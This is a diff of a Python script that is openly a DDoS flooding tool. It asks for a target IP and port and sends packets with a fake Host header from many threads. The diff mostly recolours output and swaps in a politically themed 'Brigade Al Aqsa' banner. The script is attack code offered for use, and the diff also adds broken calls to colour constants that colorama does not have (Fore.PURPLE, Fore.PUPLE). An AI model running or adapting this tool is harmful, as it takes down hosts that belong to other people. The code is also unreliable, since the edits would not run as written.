@@ -7,7 +7,8 @@ import random
 import sys
 import requests
 import colorama
-from colorama import Fore, Style
+from colorama import Fore, Style,init
+init()
 import aiohttp
 import asyncio
 def DDoS():
@@ -22,7 +23,7 @@ def DDoS():
         else:
             break;
     attack_num = 0
-    trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
+    trget = str(input(Fore.PURPLE + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
     fake = '192.178.1.38'
     #port = 80( default http port is 80)
     while True:
@@ -34,11 +35,11 @@ def DDoS():
         else:
             break;
     print(f"performing DdoS on {trget} on PORT {port} using FAKE IP {fake} ")
-    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
-   # print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
-    #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
+    print(Fore.PURPLE + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
+   # print(Fore.PURPLE + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
+    #print(Style.BRIGHT + Fore.PUPLE + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
     time.sleep(4)
-    print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
+    print(Fore.PURPLE + Style.BRIGHT + "DDos starting in ~")
     print("seconds : 3")
     time.sleep(1)
     print("seconds : 2")
@@ -56,7 +57,7 @@ def DDoS():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print("packet send!! attack number : "+ str(attack_num))
+                print("Sniper Elite send error packet!! attack number : "+ str(attack_num))
             except socket.error:
                 print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                 break
@@ -65,17 +66,17 @@ def DDoS():
     for i in range(threads):
         thread = threading.Thread(target=attack)
         thread.start()
-def print_red_centered_art():
+def print_purple_centered_art():
     os.system("clear")
     art = '''
-    @ @ @ @@ @ @ @  @@         @  @@ @ @ @  @@ @ @ @  @@       @
-          @@        @@         @  @@        @@        @@ @     @
-          @@        @@    @    @  @@        @@        @@  @    @
-          ©©        ©©    @    ©  ©© ® ®    ©© © ©    ©©   @   ©
-          ©©        ©©    @    ©  ©©        ©©        ©©    ©  ©
-          ©©         ©© ©  @ ©    ©© © ® ®  ©© © © ©  ©©     © ©
-          °°           °°   °°    °°        °°        °°      °°
-           •            °   °      °          °        °       °
+    @ @ @ @@ @ @ @  @@         @  @@     @@  @@@@@@@@ 
+          @@        @@         @  @@     @@  @@    @@ 
+          @@        @@    @    @  @@     @@  @@    @@ 
+          ©©        ©©    @    ©  ©©     @@  @@    @@
+          ©©        ©©    @    ©  ©©     @@  @@    @@ 
+          ©©         ©© ©  @ ©    ©©     ©©  ©©    ©©
+          °°           °°   °°    °°     °°  °°    °° 
+           •            °   °      °      °   °     °
                      @@          @@        @@ @         @@     @
                      @@          @@      @@     @       @@ @   @
                      @@          ©©      @@     @       @@  @  @
@@ -83,25 +84,28 @@ def print_red_centered_art():
                      ©© © ©      ©©        ©© ©         ©©     ©
                      °°          °°         °°          °°     °
                       °          °           °           °     ° '''
-    red_art = f"{Fore.BLUE}{art}{Style.RESET_ALL}"  # Set the text color to red
-    print(red_art.center(80))  # Adjust the width (80 characters) to match your terminal size
-    #red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
+    purple_art = f"{Fore.BLUE}{art}{Style.RESET_ALL}"  # Set the text color to purple
+    print(purple_art.center(80))  # Adjust the width (80 characters) to match your terminal size
+    #purple_art2 = f"{Fore.PURPLE}{art2}{Style.RESET_ALL}"
     art2 = '''||================================================================||
-||     B R I G A D E  A T T A C K E R  S N I P E R  E L I T E      
-||                     W I T H   P A L E S T I N E                 
-||               BIRRUH BIDAM               NAFDIKA YAA AQSHO
-||============================ 𒈞cwp_TL𒈞 ===========================||                                                          
+                   B R I G A D E   A L   A Q S A                       
+  
+                    F R E E   P A L E S T I N E                 
+
+
+Birruh Bidam Nafdika  Yaa  Aqsa       
+||============================ 𒈞 By Khanza 𒈞 ===========================||                                                          
 ''' 
-    red_art2 = f"{Fore.YELLOW}{art2}{Style.RESET_ALL}"
-    print(red_art2.center(80))
-    print(Fore.YELLOW + Style.BRIGHT + "[Khanza's dedication and struggle for PALESTINE]")
-if __name__ == "__main__":
-    print_red_centered_art()
+
+purple_art2 = f"{Fore.MAGENTA}{art2}{Style.RESET_ALL}"
+print(purple_art2.center(80))
+print(Fore.MAGENTA + Style.BRIGHT + "[Khanza's dedication and struggle for PALISAINE]" + Style.RESET_ALL)
+
 def menu():
    # print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" Fore.WHITE + "Press CTRL + C and press enter to exit!!")
-    print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
+    print(Style.BRIGHT + Fore.PURPLE + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
     print(Fore.WHITE + Style.BRIGHT + "——————————————————————————————————————————————————————————————————————")
-    print(Fore.YELLOW + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
+    print(Fore.PURPLE + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
     print(Fore.BLUE + Style.BRIGHT + "1. DDos a website.  [1]")
     print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
     print("Enter your options .. [e.g 1,2]") 
